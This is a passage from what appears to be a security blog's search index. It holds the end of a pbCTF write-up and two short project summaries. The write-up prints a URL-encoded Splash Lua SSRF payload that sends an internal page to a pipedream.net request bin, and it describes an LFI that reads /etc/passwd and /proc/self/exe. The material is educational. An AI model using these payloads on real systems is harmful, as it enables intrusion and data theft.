http%3A%2F%2Flocalhost%3A8050%2Fexecute%3Flua_source%3Dfunction%2520main%28splash%2C%2520args%29%2520splash%3Ago%28%2522http%3A%2F%2F172.16.0.14%2Fflag.php%2522%29%2520local%2520data%2520%3D%2520splash%3Ahtml%28%29%2520splash%3Ago%28%2522https:&#x2F;&#x2F;66409bdd5f994b912d1a7f0f28d3b33f.m.pipedream.net%2F%2522%2520..%2520data%29%2520return%2520%7Bgeometry%3Ddata%7D%2520end</span><br></pre></td></tr></table></figure><p>So, I’ll URL-encode the exploit code and pass it over.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%202.29.59.png?raw=true"></p><p>When I sent the above exploit payload, I could see the flag coming to the requestbin.</p><blockquote><p>FLAG : pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}</p></blockquote><hr><h2 id="Web-Apoche-I-58-pts"><a href="#Web-Apoche-I-58-pts" class="headerlink" title=" (Web) Apoche I [58 pts]"></a><span style="color:#21C587"></span> (Web) Apoche I [58 pts]</h2><p>This time, we will solve a challenge called Apoche I among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.19.31.png?raw=true"><br>Looking at the challenge description, there are 5 URLs given. You can connect to an open server among 5 servers. (Some servers are closed.)</p><p>And looking at the hint, it says to get information about the binary.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.23.10.png?raw=true"><br>I connected to 34.68.159.75:41521, and when I checked the robots.txt file, I could see that there is a secret directory. I thought LFI would happen here, so I grabbed a proxy and attempted an LFI attack.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.27.43.png?raw=true"><br>When I grabbed the request using Burp Suite and accessed the <code>/etc/passwd</code> file, I could see that the <code>LFI</code> worked well.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.32.50.png?raw=true"><br>So I accessed <code>/proc/self/exe</code> to get the <code>binary file</code>, and when I searched for <code>pbctf&#123;</code>, I could see that the binary file had a flag.</p><blockquote><p>FLAG : pbctf{n0t_re4lly_apache_ap0che!}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Path Traversal </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (dJango)</title>
      <link href="2020/10/24/2020-10-24-Project-2/"/>
      <url>2020/10/24/2020-10-24-Project-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h2><p>N0named 팀을 활동할 때, dJango Project에 참여를 했었는데 그때 로그인, 회원가입, 비밀번호 찾기, 이메일 인증, 어드민 패널, 문제 관리 페이지 개발을 맡았었습니다. 이때 처음으로 dJango 웹 프레임워크를 이용해봤는데 에러 때문에 조금 애를 먹었지만 괜찮았던 거 같습니다. 하지만 갓 프레임워크는 flask, node인 거 같네요.<br></p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML</code>, <code>python</code>, <code>php</code>, <code>javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;<code>PostgreSQL</code><br><br>WF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>dJango</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p>(생략)<br><br><code>Jeongwon Jo</code><br><br>(생략)</p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>undefined<br></p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/dJango_Project/tree/main/source">SOURCE</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (PHP)</title>
      <link href="2020/06/05/2020-09-16-Project-1/"/>
      <url>2020/06/05/2020-09-16-Project-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h2><p>For this project, I developed a web service, hacking the developed web service, and wrote a report.</p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML, PHP, Javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;<code>MySQL</code><br><br>Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Apache 2</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p><code>Jeongwon Jo (Captain)</code></p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>2020.9.16 ~ 2020.9.24 (9 days)</p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/PHP_Project/tree/main/PHP_Project">SOURCE</a></p><hr><h2 id="Project-Report"><a href="#Project-Report" class="headerlink" title="Project Report"></a>Project Report<br></h2><p><a href="https://drive.google.com/file/d/1HHR8SHupKmN8GULlptPNFeVe7JJEUXK9/view">PDF</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
